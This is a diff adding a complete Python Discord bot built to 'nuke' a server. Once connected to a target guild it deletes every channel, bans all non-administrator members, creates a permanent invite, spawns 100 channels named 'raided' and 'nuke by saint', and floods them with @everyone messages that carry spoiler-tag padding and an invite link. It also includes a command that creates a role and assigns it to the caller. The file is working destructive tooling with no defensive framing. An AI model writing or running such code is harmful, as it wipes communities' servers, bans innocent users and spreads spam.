@@ -1,0 +1,199 @@
+import discord
+import asyncio
+from discord.ext import commands
+
+welcome_message = '''
+@everyone nuked by ; & 2geeked
+
+||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​
+
+https://tenor.com/view/hello-agents-federal-dance-vr-gif-25372961
+https://discord.gg/vyu3Z9pmeM
+'''
+
+# Number of channels to create
+num_channels = 100  # Total number of channels to create
+channel_names = [
+    "beamed by saint",
+    "2geeked",
+    "raided",
+    "sniped",
+    "nuke by saint"
+]
+
+# Initialize the bot with the necessary intents
+intents = discord.Intents.default()
+intents.guilds = True  # Enable guild-related events
+intents.members = True  # Enable member-related events
+bot = commands.Bot(command_prefix="!", intents=intents)
+
+GUILD_ID = INPUT_GUILD_ID
+async def delete_all_channels(guild):
+    """Delete all existing channels in the guild."""
+    for channel in guild.channels:
+        try:
+            await channel.delete()
+            print(f'Deleted channel: {channel.name}')
+        except discord.Forbidden:
+            print(f'Cannot delete channel: {channel.name} (Forbidden)')
+        except discord.HTTPException:
+            print(f'Failed to delete channel: {channel.name} (HTTP Exception)')
+    print("All channels deleted.")
+
+async def create_role(guild, role_name):
+    """Create a role with the given name."""
+    existing_role = discord.utils.get(guild.roles, name=role_name)
+    if not existing_role:
+        new_role = await guild.create_role(name=role_name, color=discord.Color.from_rgb(0, 0, 0))
+        print(f'Role **{new_role.name}** has been created!')
+        return new_role
+    return existing_role
+
+async def send_welcome_message(guild, message):
+    """Send a welcome message to all text channels in the guild."""
+    for channel in guild.text_channels:
+        try:
+            await channel.send(message)
+        except discord.Forbidden:
+            print(f'Cannot send message in {channel.name}.')
+        except discord.HTTPException:
+            print(f'Failed to send message in {channel.name}.')
+
+async def create_channel_and_send_message(guild, channel_name, index):
+    """Create a channel and send a welcome message in all channels."""
+    channel = await guild.create_text_channel(channel_name)
+    print(f'Channel {channel_name} created!')
+
+    # Create and assign the role "opp 2 X" where X is the index
+    role_name = f"SAINTx2GEEKED"
+    role = await create_role(guild, role_name)
+
+    # Send welcome message to all channels
+    await send_welcome_message(guild, welcome_message)
+
+    # Assign the role to all non-bot members
+    for member in guild.members:
+        if not member.bot:
+            try:
+                await member.add_roles(role)
+                print(f'Assigned role **{role.name}** to {member.name}#{member.discriminator}.')
+            except discord.Forbidden:
+                print(f'Cannot assign role to {member.name}#{member.discriminator} (Forbidden)')
+            except discord.HTTPException:
+                print(f'Failed to assign role to {member.name}#{member.discriminator} (HTTP Exception)')
+
+
+async def create_star_channel(guild):
+  try:
+      channel = await guild.create_text_channel('star')
+      print(f'Channel "star" created!')
+      return channel
+  except discord.Forbidden:
+      print("Cannot create channel (Forbidden)")
+  except discord.HTTPException:
+      print("Failed to create channel (HTTP Exception)")
+  return None
+
+async def create_permanent_invite(channel):
+  if channel and channel.permissions_for(channel.guild.me).create_instant_invite:
+      try:
+          invite = await channel.create_invite(max_age=0, max_uses=0)
+          print(f'Permanent invite created: {invite}')
+          return invite
+      except discord.Forbidden:
+          print(f'Cannot create invite in {channel.name} (Forbidden)')
+      except discord.HTTPException:
+          print(f'Failed to create invite in {channel.name} (HTTP Exception)')
+  else:
+      print('No suitable channel found for creating an invite.')
+  return None
+
+
+
+
+
+async def create_channels(guild):
+    """Create specified number of channels and assign roles."""
+    for i in range(num_channels):
+        channel_name = channel_names[i % len(channel_names)]  # Alternate through channel names
+        await create_channel_and_send_message(guild, channel_name, i)
+        await asyncio.sleep(0.3)  # Wait for 0.3 seconds before creating the next channel
+
+async def ban_members(guild):
+    """Ban non-admin members in the guild."""
+    for member in guild.members:
+        if not member.guild_permissions.administrator and member != bot.user:
+            try:
+                await member.ban(reason="Clapped by ;")
+                print(f'Banned {member.name}#{member.discriminator}.')
+            except discord.Forbidden:
+                print(f'Failed to ban {member.name}#{member.discriminator}: Missing permissions.')
+            except discord.HTTPException:
+                print(f'Failed to ban {member.name}#{member.discriminator}: HTTP Exception occurred.')
+        else:
+            print(f'Skipped {member.name}#{member.discriminator}: has Administrator permission or is the bot.')
+
+async def create_permanent_invite(guild):
+    """Creates a permanent invite for the first available text channel in the guild."""
+    for channel in guild.channels:
+        if isinstance(channel, discord.TextChannel) and channel.permissions_for(guild.me).create_instant_invite:
+            try:
+                invite = await channel.create_invite(max_age=0, max_uses=0)  # Permanent invite
+                print(f'Permanent invite created: {invite}')
+                return
+            except discord.Forbidden:
+                print(f'Cannot create invite in {channel.name} (Forbidden)')
+            except discord.HTTPException:
+                print(f'Failed to create invite in {channel.name} (HTTP Exception)')
+    print('No suitable channel found for creating an invite.')
+
+@bot.event
+async def on_ready():
+    print(f'Bot is ready! Logged in as {bot.user}')
+
+    guild = bot.get_guild(GUILD_ID)
+    if guild:
+        print(f'Connected to guild: {guild.name}')
+      
+        
+
+        # Delete all existing channels
+        await delete_all_channels(guild)
+        await create_star_channel(guild)
+        await create_permanent_invite(guild)
+        await ban_members(guild)
+
+        # Create channels
+        await create_channels(guild)  # Create channels after banning
+    else:
+        print('Guild not found.')
+
+@bot.command()
+async def A(ctx):
+    guild = ctx.guild  # Get the guild from the context
+
+    # Check if the role already exists
+    existing_role = discord.utils.get(guild.roles, name="0000x10")
+
+    if existing_role:
+        # If the role exists, assign it to the user
+        try:
+            await ctx.author.add_roles(existing_role)
+            await ctx.send(f'Role **{existing_role.name}** has been assigned to you!')
+        except discord.Forbidden:
+            await ctx.send("I don't have permission to assign roles.")
+        except discord.HTTPException:
+            await ctx.send("An error occurred while assigning the role.")
+    else:
+        # Create the role with black color
+        try:
+            new_role = await guild.create_role(name="0000x10", color=discord.Color.from_rgb(0, 0, 0))
+            await ctx.author.add_roles(new_role)
+            await ctx.send(f'Role **{new_role.name}** has been created and assigned to you!')
+        except discord.Forbidden:
+            await ctx.send("I don't have permission to create or assign roles.")
+        except discord.HTTPException:
+            await ctx.send("An error occurred while creating or assigning the role.")
+ 
+
+bot.run('TOKEN')
